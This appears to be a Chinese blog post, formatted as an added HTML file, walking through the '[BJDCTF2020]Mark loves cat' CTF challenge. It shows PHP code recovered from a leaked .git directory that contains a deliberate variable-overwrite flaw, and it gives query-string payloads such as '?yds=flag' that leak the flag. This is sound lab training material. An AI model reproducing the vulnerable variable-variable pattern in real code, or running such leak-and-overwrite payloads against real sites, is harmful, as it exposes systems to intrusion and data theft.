@@ -1,0 +1,208 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>buuctf30 - 林北</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[BJDCTF2020]Mark loves cat打开容器，发现是一个很“漂亮”的网页：
+
+一.初步尝试查看源码，没有发现什么信息，用git_extract扫出是git泄露，但是第一次我只扫出fl,"> 
+    <meta name="author" content="linbei"> 
+    <link rel="alternative" href="atom.xml" title="林北" type="application/atom+xml"> 
+    <link rel="icon" href="/img/3.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">林北</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">buuctf30</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">buuctf30</h1>
+        <div class="stuff">
+            <span>九月 13, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>打开容器，发现是一个很“漂亮”的网页：</p>
+<p><img src="/2021/09/13/buuctf30/f75b5b3c4d96d4b7c41b089df0e0547.png" alt="f75b5b3c4d96d4b7c41b089df0e0547"></p>
+<h3 id="一-初步尝试"><a href="#一-初步尝试" class="headerlink" title="一.初步尝试"></a>一.初步尝试</h3><p>查看源码，没有发现什么信息，用git_extract扫出是git泄露，但是第一次我只扫出flag.php：</p>
+<p><img src="/2021/09/13/buuctf30/image-20210919162449299.png" alt="image-20210919162449299"></p>
+<p>再扫一次扫出index.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h3><ul>
+<li><p><strong>foreach()函数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach (iterable_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (iterable_expression as $key &#x3D;&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">第一种格式遍历给定的 &#96;iterable_expression&#96;  迭代器。每次循环中，当前单元的值被赋给 &#96;$value&#96;。 </span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量  &#96;$key&#96;。 </span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>总之，foreach函数可以实现变量覆盖</p>
+<ul>
+<li><p>结合前面的flag.php文件可以看到变量$flag的参数值就是对应的flag了</p>
+<p>因此有两种解法：一种是构造满足if判断的语句 利用exit($flag)输出flag</p>
+<p>​                               另一种是绕过如有if语句判断  执行代码：echo “the flag is: “.$flag;</p>
+</li>
+</ul>
+<h3 id="三-构造paylaod"><a href="#三-构造paylaod" class="headerlink" title="三.构造paylaod"></a>三.构造paylaod</h3><ul>
+<li><p>第一种：</p>
+<p>payload：<code>?yds=flag</code></p>
+<p>经过第二个foreach()：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$x&#x3D; yds          $y&#x3D;flag </span><br><span class="line">$$x&#x3D;$yds         $$y&#x3D;$flag</span><br><span class="line">相当于$yds&#x3D;$flag</span><br></pre></td></tr></table></figure>
+
+<p>这样就满足第二个if语句判断，执行代码：exit($yds)&lt;=&gt;exit($flag)</p>
+<p>或  payload：<code>?is=flag&amp;flag=flag</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$x&#x3D;is           $y&#x3D;flag</span><br><span class="line">$$x&#x3D;$is         $$y&#x3D;$falg</span><br><span class="line">x相当于$is&#x3D;$flag</span><br></pre></td></tr></table></figure>
+
+<p>flag=flag满足第三个if语句判断，执行代码：exit($is)&lt;=&gt;exit($flag)</p>
+</li>
+</ul>
+<ul>
+<li><p>第二种：</p>
+<p>payload：<code>flag=1</code></p>
+<p>但是在实际测试时发现echo为空：<img src="/2021/09/13/buuctf30/image-20210919171328613.png" alt="image-20210919171328613"></p>
+</li>
+</ul>
+<p>​        为什么呢？原来是第二个foreach后，覆盖变量$flag=$1，但是我们没有给$1赋值，那么$flag就为空。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
